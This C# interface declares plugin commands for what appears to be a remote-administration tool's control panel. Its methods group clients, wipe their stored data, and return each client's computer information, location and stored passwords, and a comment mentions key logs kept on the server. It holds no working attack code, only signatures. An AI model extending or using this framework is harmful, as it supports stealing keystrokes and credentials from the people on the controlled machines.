using System.Collections.Generic;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;

namespace Orcus.Administration.Plugins.CommandViewPlugin
{
    /// <summary>
    ///     Some static commands
    /// </summary>
    public interface IClientCommands
    {
        /// <summary>
        ///     Change the group of the <see cref="clients" /> to <see cref="newName" />
        /// </summary>
        void ChangeGroup(List<BaseClientInformation> clients, string newName);

        /// <summary>
        ///     Removes all stored data of the <see cref="clients" /> on the server like key logs, passwords, computer information,
        ///     ...
        /// </summary>
        void RemoveStoredData(List<OfflineClientInformation> clients);

        /// <summary>
        ///     Returns the stored computer information from the server of the <see cref="client" />
        /// </summary>
        ComputerInformation GetComputerInformation(BaseClientInformation client);

        /// <summary>
        ///     Returns the stored passwords from the server of the <see cref="client" />
        /// </summary>
        PasswordData GetPasswords(BaseClientInformation client);

        /// <summary>
        ///     Returns the location of the client
        /// </summary>
        LocationInfo GetClientLocation(BaseClientInformation client);
    }
}